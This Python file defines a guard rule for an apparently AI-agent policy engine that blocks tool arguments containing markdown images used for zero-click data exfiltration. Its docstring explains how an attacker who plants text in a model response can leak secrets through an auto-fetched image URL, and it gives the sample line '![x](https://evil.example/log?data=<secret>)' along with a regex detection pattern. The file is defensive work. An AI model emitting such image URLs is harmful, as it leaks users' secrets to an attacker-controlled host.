"""Argument guard: block zero-click markdown-image exfiltration.

Markdown image syntax pairs a visible alt text with a URL the renderer fetches
*automatically* - no click, no hover, no user consent. An attacker who can get
text into a model response (or any field a downstream renderer trusts) can plant
``![x](https://evil.example/log?data=<secret>)`` and the secret rides out on the
image fetch itself. The renderer is the exfiltration channel, so nothing needs
to be clicked for the data to leave.

The signature of this technique is structural, not lexical: an image URL that
carries a *payload parameter* in its query string or path - the classic
``?data=``, ``?token=``, ``?secret=``, ``?key=``, ``?q=``. That is the shape
this rule matches. A plain image reference (``![chart](https://cdn/chart.png)``)
has no such parameter and is left alone, which keeps ordinary prose and
documentation images from tripping the guard.

This sits on the *argument* detector, ahead of any tool effect, so it blocks the
call before the image is ever rendered or fetched. Only top-level *string* values
of a dict ``args`` are inspected; ints, None and nested containers are skipped
rather than stringified, so structural data cannot fake a match and odd input
never raises. The first matching value blocks and names the offending argument;
no match returns None (no opinion), leaving the engine's default-allow path for
benign traffic.
"""
from __future__ import annotations

import re
from typing import Optional

from ..enforce import Decision
from ..event import SensorEvent
from ..policy.engine import Rule

POLICY_ID = "markdown_image_exfil"

# Markdown image whose URL carries a query-parameter payload:
#   ![alt](https://host/path?payload=...)  or  ![alt](https://host/payload=...)
# ``[^\]]*`` covers the alt text (including empty), ``https?://`` pins it to a
# fetchable image URL, and the ``(?:\?|/)`` before the payload lets the parameter
# arrive via a query string or a path segment. The captured group is the whole
# offending URL so the match is self-describing in logs.
#
# No re.IGNORECASE: the keyword alternation is lowercase by design, and matching
# ``Token=`` / ``Q=`` would widen the rule past the intended technique rather
# than express it, so the flag is deliberately omitted.
PATTERN = re.compile(
    r"!\[[^\]]*\]\((https?://[^)]*(?:\?|/)[^)]*(?:token|data|secret|key|q)=[^)]*)\)"
)


def markdown_image_exfil_guard() -> Rule:
    """Build a Rule that blocks zero-click markdown-image exfiltration.

    Each top-level str value of a dict ``args`` is tested against
    :data:`PATTERN`. On the first match the rule returns a BLOCK naming the
    offending argument, so the caller can tell which field carried the exfil
    image. A non-dict ``args``, a dict with no str values, and a dict whose str
    values are all benign each return None (no opinion). The rule never raises.
    """

    def rule(event: SensorEvent) -> Optional[Decision]:
        args = getattr(event, "args", None)
        if not isinstance(args, dict):
            return None

        for name, value in args.items():
            if not isinstance(value, str):
                continue
            if PATTERN.search(value):
                return Decision.block(
                    reason="markdown_image_exfil: {}".format(name),
                    policy_id=POLICY_ID,
                    attributed_to=name,
                )

        return None

    return rule
